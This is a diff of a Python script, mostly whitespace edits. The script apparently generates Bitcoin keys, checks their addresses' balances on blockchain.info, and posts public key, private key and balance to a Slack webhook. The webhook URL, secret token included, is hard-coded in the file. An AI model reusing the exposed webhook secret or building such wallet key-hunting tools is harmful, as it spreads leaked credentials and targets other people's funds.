@@ -1,12 +1,10 @@
 import sqlite3
 import datetime as dt
-
 import requests
-
 import keys
 
 ENDPOINT = 'https://blockchain.info/balance'
-SLACK_WEBHOOK = 'https://hooks.slack.com/services/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'
+SLACK_WEBHOOK = 'https://hooks.slack.com/services/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' # Hmmm... keep private? 
 
 def main():
     # Initialize address generator
@@ -100,6 +98,7 @@ def send_address_details(public_key, private_key, balance):
         }]
     }
     return requests.post(SLACK_WEBHOOK, json=payload)
+
 
 if __name__ == '__main__':
     main()
